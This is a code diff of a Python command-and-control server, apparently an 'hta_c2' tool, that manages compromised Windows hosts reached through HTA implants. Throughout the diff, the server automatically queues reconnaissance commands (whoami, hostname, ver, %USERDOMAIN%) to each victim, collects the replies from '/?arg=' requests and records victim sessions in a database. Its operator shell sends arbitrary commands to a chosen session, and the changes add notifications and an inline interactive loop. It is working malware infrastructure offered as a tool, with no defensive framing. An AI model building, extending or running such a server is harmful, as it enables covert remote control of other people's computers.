@@ -1,4 +1,3 @@
-# server.py
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import urllib.parse
 import base64
@@ -10,6 +9,7 @@ import datetime
 import uuid
 import sqlite3
 import random
+import time
 
 DB_PATH = os.path.join(os.path.dirname(__file__), "server_config.db")
 HISTORY_FILE = os.path.expanduser("~/.hta_c2_history")
@@ -17,13 +17,16 @@ HISTORY_FILE = os.path.expanduser("~/.hta_c2_history")
 listeners = {}
 listeners_lock = threading.Lock()
 
-# sessions keyed by 6-digit session id
 sessions = {}
 sessions_lock = threading.Lock()
 
-# temporary per-client state keyed by client_ip
 seen_clients = {}
 seen_clients_lock = threading.Lock()
+
+notifications = []
+notifications_lock = threading.Lock()
+notified_sessions = set()
+notified_sessions_lock = threading.Lock()
 
 
 def init_db():
@@ -103,23 +106,41 @@ def db_remove_listener(lport):
     conn.close()
 
 
+def push_notification(msg, session_id=None):
+    with notifications_lock:
+        # avoid exact duplicate notification for same session_id
+        if session_id:
+            with notified_sessions_lock:
+                if session_id in notified_sessions:
+                    return
+                notified_sessions.add(session_id)
+        notifications.append(msg)
+
+
+def pop_notifications():
+    msgs = []
+    with notifications_lock:
+        while notifications:
+            msgs.append(notifications.pop(0))
+    return msgs
+
+
 class HTAHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         client_ip = self.client_address[0]
         path = self.path
+        raw = ""
         if path.startswith("/?arg="):
             raw = path[6:]
-        else:
-            raw = ""
-        
+        # Ensure client state exists
         with seen_clients_lock:
             state = seen_clients.get(client_ip)
             if state is None:
                 seen_clients[client_ip] = {
                     "bulk": "",
-                    "queue": [],
-                    "last_cmd": None,
-                    "collected": {},
+                    "queue": [],          # queued commands to send to client
+                    "last_cmd": None,     # last sent command
+                    "collected": {},      # collected outputs
                     "created_at": None,
                     "session_id": None
                 }
@@ -127,6 +148,7 @@ class HTAHandler(BaseHTTPRequestHandler):
 
         if raw == "":
             with seen_clients_lock:
+                # first contact or poll without payload: initialize queue if empty
                 if not state["queue"]:
                     state["queue"] = ["whoami", "hostname", "ver", "echo %USERDOMAIN%"]
                     state["created_at"] = datetime.datetime.now(datetime.timezone.utc).isoformat()
@@ -142,6 +164,7 @@ class HTAHandler(BaseHTTPRequestHandler):
                     pass
             return
 
+        # there is some payload -> accumulate
         with seen_clients_lock:
             state["bulk"] += raw
             if "*" in raw:
@@ -159,6 +182,7 @@ class HTAHandler(BaseHTTPRequestHandler):
                 last = state.get("last_cmd")
                 if last:
                     state["collected"][last] = output.strip()
+                # if queue has more commands, send next
                 if state["queue"]:
                     next_cmd = state["queue"].pop(0)
                     state["last_cmd"] = next_cmd
@@ -170,12 +194,13 @@ class HTAHandler(BaseHTTPRequestHandler):
                     except BrokenPipeError:
                         pass
                     return
-                else:
+                # finalize session if not created
+                if not state.get("session_id"):
                     username = state["collected"].get("whoami", "").strip()
                     if "\\" in username:
                         domain, username_only = username.split("\\", 1)
                     else:
-                        username_only = username
+                        username_only = username or "unknown"
                         domain = ""
                     hostname = state["collected"].get("hostname", "").strip() or "unknown"
                     windows_ver = state["collected"].get("ver", "").strip() or "unknown"
@@ -187,13 +212,12 @@ class HTAHandler(BaseHTTPRequestHandler):
                     with sessions_lock:
                         while sid in sessions:
                             sid = gen_id()
+                        # check DB for duplicates by username+hostname+src_ip
                         conn = sqlite3.connect(DB_PATH)
                         c = conn.cursor()
                         c.execute('SELECT session_id FROM sessions WHERE username = ? AND hostname = ? AND src_ip = ?', (username_only, hostname, client_ip))
-                        if c.fetchone():
-                           
-                            c.execute('SELECT session_id FROM sessions WHERE username = ? AND hostname = ? AND src_ip = ?', (username_only, hostname, client_ip))
-                            row = c.fetchone()
+                        row = c.fetchone()
+                        if row:
                             sid = row[0]
                         else:
                             db_add_session(sid, username_only, hostname, windows_ver, domain_out, client_ip, created_at)
@@ -207,7 +231,9 @@ class HTAHandler(BaseHTTPRequestHandler):
                             "src_ip": client_ip,
                             "queue": []
                         }
-                    print(f"[+] New session from {username_only}/{domain_out} connected (ID: {sid})")
+                        state["session_id"] = sid
+                    push_notification(f"[+] New session from {hostname}/{username_only} connected (ID: {sid})", session_id=sid)
+                # reply empty
                 self.send_response(200)
                 self.send_header('Content-type', 'text/html')
                 self.end_headers()
@@ -216,6 +242,7 @@ class HTAHandler(BaseHTTPRequestHandler):
                 except BrokenPipeError:
                     pass
                 return
+
         self.send_response(200)
         self.send_header('Content-type', 'text/html')
         self.end_headers()
@@ -330,6 +357,9 @@ def list_listeners():
 
 
 def list_sessions():
+    # flush notifications first so new sessions appear before listing
+    for m in pop_notifications():
+        print(m)
     with sessions_lock:
         if not sessions:
             print("[*] No active sessions.")
@@ -359,6 +389,16 @@ def enqueue_command_for_session(session_id, cmd):
     return True
 
 
+def pop_session_command(session_id):
+    with sessions_lock:
+        s = sessions.get(session_id)
+        if not s:
+            return None
+        if s["queue"]:
+            return s["queue"].pop(0)
+    return None
+
+
 def load_existing_listeners():
     init_db()
     rows = db_get_listeners()
@@ -376,7 +416,8 @@ def repl():
     except FileNotFoundError:
         pass
 
-        banner = r'''
+
+    banner = r'''
  ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
 ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
 ▐░▌       ▐░▌ ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌     ▐░█▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀█░▌
@@ -401,6 +442,9 @@ def repl():
     exit                               stop server"""
 
     while True:
+        for m in pop_notifications():
+            print(m)
+
         try:
             line = input("hta_c2 >> ").strip()
         except (EOFError, KeyboardInterrupt):
@@ -441,9 +485,20 @@ def repl():
                 if not s:
                     print("session not found")
                 else:
-                    import interact as intr
-                    # choose any running listener server to deliver commands (server.cmds not used; we rely on per-client queue)
-                    intr.interact(sid)
+                    # simple interactive loop that queues commands and prints notifications
+                    try:
+                        while True:
+                            # show any notifications
+                            for m in pop_notifications():
+                                print(m)
+                            cmdline = input(f"{s['hostname']}\\{s['username']} ({sid}) >> ").strip()
+                            if not cmdline:
+                                continue
+                            if cmdline.lower() in ("exit", "quit"):
+                                break
+                            enqueue_command_for_session(sid, cmdline)
+                    except KeyboardInterrupt:
+                        print()
         elif cmd == "exit":
             break
         else:
